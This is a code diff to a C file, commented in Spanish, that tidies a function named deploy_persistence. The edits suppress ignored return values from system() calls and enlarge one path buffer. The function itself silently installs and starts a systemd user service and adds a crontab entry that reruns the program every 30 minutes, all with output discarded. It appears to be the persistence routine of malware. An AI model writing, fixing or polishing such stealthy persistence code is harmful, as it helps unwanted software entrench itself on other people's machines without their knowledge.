@@ -57,9 +57,9 @@ void deploy_persistence(const char *executable_path) {
     // mkdir -p equivalente
     char cmd[1024];
     snprintf(cmd, sizeof(cmd), "mkdir -p %s", systemd_dir);
-    system(cmd);
+    if (system(cmd) != 0) { /* Ignore */ }
 
-    char service_path[512];
+    char service_path[1024]; // Aumentado para evitar truncamiento
     snprintf(service_path, sizeof(service_path), "%s/%s.service", systemd_dir, INSTALL_NAME);
 
     if (access(service_path, F_OK) != 0) {
@@ -72,9 +72,9 @@ void deploy_persistence(const char *executable_path) {
             fclose(f);
             // Habilitar sin salida
             snprintf(cmd, sizeof(cmd), "systemctl --user enable %s.service >/dev/null 2>&1", INSTALL_NAME);
-            system(cmd);
+            if (system(cmd) != 0) { /* Ignore */ }
             snprintf(cmd, sizeof(cmd), "systemctl --user start %s.service >/dev/null 2>&1", INSTALL_NAME);
-            system(cmd);
+            if (system(cmd) != 0) { /* Ignore */ }
         }
     }
 
@@ -84,6 +84,6 @@ void deploy_persistence(const char *executable_path) {
     if (system(cmd) != 0) {
         // No encontrado, añadir
         snprintf(cmd, sizeof(cmd), "(crontab -l 2>/dev/null; echo \"*/30 * * * * %s >/dev/null 2>&1\") | crontab -", executable_path);
-        system(cmd);
+        if (system(cmd) != 0) { /* Ignore */ }
     }
 }
